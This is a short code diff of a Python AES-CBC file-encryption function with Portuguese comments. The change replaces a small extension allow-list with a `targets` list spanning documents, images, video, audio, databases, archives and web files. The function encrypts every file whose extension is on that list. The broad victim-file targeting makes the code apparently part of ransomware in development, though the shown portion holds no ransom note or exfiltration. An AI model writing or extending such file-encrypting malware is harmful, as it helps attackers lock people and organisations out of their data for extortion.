@@ -5,11 +5,33 @@ from Crypto.Util.Padding import pad
 
 def encrypt_file(file_path, key):
     """Criptografa o arquivo com a chave fornecida e salva o arquivo criptografado."""
+    targets = [
+            # Documentos
+            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt',
+
+            # Imagens
+            '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.tiff',
+
+            # Vídeos
+            '.mp4', '.avi', '.mkv', '.mov', '.wmv',
+
+            # Áudios
+            '.mp3', '.wav', '.aac', '.flac',
+
+            # Bancos de Dados
+            '.sql', '.db', '.mdb', '.accdb',
+
+            # Arquivos compactados
+            '.zip', '.rar', '.7z', '.tar', '.gz',
+
+            # Outros
+            '.html', '.php', '.js', '.css', '.xml'
+            ]
     try:
         cipher = AES.new(key, AES.MODE_CBC)
 
         file_extension = os.path.splitext(file_path)[1].lower()
-        if file_extension not in ['.pdf', '.txt', '.xlsx', '.docx', '.json', '.html']:
+        if file_extension not in targets:
             return  
 
         with open(file_path, "rb") as f:
